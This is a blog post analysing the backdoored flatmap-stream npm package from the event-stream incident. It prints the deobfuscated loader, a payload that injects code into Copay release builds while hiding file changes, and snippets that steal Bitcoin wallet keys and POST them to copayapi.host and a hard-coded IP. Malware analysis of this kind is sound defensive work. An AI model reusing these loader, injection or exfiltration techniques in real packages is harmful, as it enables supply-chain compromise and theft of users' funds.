+++
title = "Reversing flatmap-stream"
date = 2019-01-13T00:00:00-08:00
draft = false
tags = ["javascript", "security", "reversing"]
description = "Taking a belated look at the backdoored flatmap-stream package."
summary = "flatmap-stream was pulled in as a nested dependency of event-stream, and its minified build carried extra, obfuscated code. Let's reverse it and figure out what it does."
+++

{{< alert "circle-info" >}}
Originally published on my old site in January 2019, a couple of months after the
`event-stream` compromise. Moved here with only typo fixes. The specific attack is
long dead, but the shape of it — a dependency that decrypts its own payload using a
value found only on the target machine, so it stays inert everywhere else — is worth
being able to recognise.
{{< /alert >}}

flatmap-stream was pulled in as a nested dependency of the widely used NPM
library event-stream. It was discovered that
[the minified version of flatmap-stream had some extra, obfuscated code](https://github.com/dominictarr/event-stream/issues/116).
Let's reverse the code to try to figure out what exactly it is doing.

## Prettifying the code

```js
!(function() {
  try {
    var r = require,
      t = process;
    function e(r) {
      return Buffer.from(r, 'hex').toString();
    }

    var n = r(e('2e2f746573742f64617461')),
      o = t[e(n[3])][e(n[4])];

    if (!o) return;

    var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
      a = u.update(n[0], e(n[8]), e(n[9]));
    a += u.final(e(n[9]));

    var f = new module.constructor();

    (f.paths = module.paths), f[e(n[7])](a, ''), f.exports(n[1]);
  } catch (r) {}
})();
```

The first thing of note is the `e` function, which converts hex strings. The
payload for this malware is hidden within these hex strings.

First string:

```js
> decode("2e2f746573742f64617461")
'./test/data'
```

This line imports code from the ./test/data folder, which contains 10 more hex
obfuscated strings.

```js
module.exports = [
  '...truncated...',
  '...truncated...',
  '63727970746f',
  '656e76',
  '6e706d5f7061636b6167655f6465736372697074696f6e',
  '616573323536',
  '6372656174654465636970686572',
  '5f636f6d70696c65',
  '686578',
  '75746638',
];
```

After decoding and unobfuscating the code, we get

```js
!(function() {
  try {
    var r = require,
      t = process;
    function decode(r) {
      return Buffer.from(r, 'hex').toString();
    }

    // Get data
    var data = require('./test/data');
    // Get the package description, and exit early if it doesn't exist
    var packageDescription = process.env.npm_package_description;
    if (!packageDescription) {
      return;
    }

    // Decode the first payload with the npm package description
    var u = require('crypto').createDecipher('aes256', packageDescription);
    var firstPayload = u.update(data[0], 'hex', 'utf8');
    firstPayload += u.final('utf8');

    // Build a new module
    var f = new module.constructor();

    // Build a new module with the first and second payloads
    (f.paths = module.paths), f._compile(firstPayload, ''), f.exports(data[1]);
  } catch (r) {}
})();
```

This bootstrapping script is looking for a specific module name to properly
decode the payload. We could write a script to harvest npm package descriptions
that have flatmap-stream in their dependency tree. However, as the target package
has already been discovered, we'll cheat. The AES256 decryption key is
`A Secure Bitcoin Wallet`, which was/is the description of the copay package.

## The first payload

```js
module.exports = function(e) {
  try {
    // Exit if specific args aren't in the command line
    if (!/build\:.*\-release/.test(process.argv[2])) return;

    // Same npm pack
    var packageDescription = process.env.npm_package_description,
      r = require('fs'),
      i =
        './node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js',
      // Get stats on ReedSolomonDecoder
      // Read file
      n = r.statSync(i),
      c = r.readFileSync(i, 'utf8'),
      // Create another cipher
      o = require('crypto').createDecipher('aes256', packageDescription),
      // Decrypt
      s = o.update(e, 'hex', 'utf8');
    s = '\n' + (s += o.final('utf8'));

    // Write the payload into ReedSolomonDecoder, and reset utimes
    var a = c.indexOf('\n/*@@*/');
    0 <= a && (c = c.substr(0, a)),
      r.writeFileSync(i, c + s, 'utf8'),
      r.utimesSync(i, n.atime, n.mtime),
      process.on('exit', function() {
        try {
          r.writeFileSync(i, c, 'utf8'), r.utimesSync(i, n.atime, n.mtime);
        } catch (e) {}
      });
  } catch (e) {}
};
```

The first payload injects the second payload into release builds of the package.

## The second payload

After decrypting the second payload with the key listed above, we find the meat
and potatoes of the malware. Rather than posting the entire block of code, I'll
post snippets that indicate what this payload does.

### POST to copayapi.host:8080 and 111.90.151.134:8080 with url e and payload n

```js
postToUrl('636f7061796170692e686f7374', e, n),
  postToUrl('3131312e39302e3135312e313334', e, n);
```

### Look for wallet files and send the wallet data to hosts above

```js
readFromFile('profile', function(e) {
  for (var t in e.credentials) {
    var n = e.credentials[t];
    // If livenet is the network, look in balanceCache files
    'livenet' == n.network &&
      readFromFile(
        'balanceCache-' + n.walletId,
        function(e) {
          var t = this;
          t.balance = parseFloat(e.balance.split(' ')[0]);
          ('btc' == t.coin && t.balance < 100) ||
            ('bch' == t.coin && t.balance < 1e3) ||
            // Set the wallet's xPubKey to a global var
            // POST wallet information to url:8080/c, 200 bytes at a time
            ((global.CSSMap[t.xPubKey] = !0),
            chunkAndPost('c', JSON.stringify(t)));
        }.bind(n)
      );
  }
});
```

### Extract wallet keys and send to hosts above

```js
var e = require('bitcore-wallet-client/lib/credentials.js');
// Extends getKeysFunc to send all the key information
// Also sends xPubKey previously set in the global var, and clears it
(e.prototype.getKeysFunc = e.prototype.getKeys),
  (e.prototype.getKeys = function(e) {
    var t = this.getKeysFunc(e);
    try {
      global.CSSMap &&
        global.CSSMap[this.xPubKey] &&
        (delete global.CSSMap[this.xPubKey],
        // POST to url:8080/p, 200 bytes at a time
        chunkAndPost('p', e + '\t' + this.xPubKey));
    } catch (e) {}
    return t;
  });
```

At this point, it's fairly clear that this piece of malware steals bitcoins and
bitcoin cash. This is a fairly narrow scope attack. Most users of the
event-stream package weren't even affected in the first place.

I realize that this blog post is coming fairly late after the original incident,
and most of the detective work has already been performed. However, I wanted to
take my own stab at it to see if I could reverse it myself.
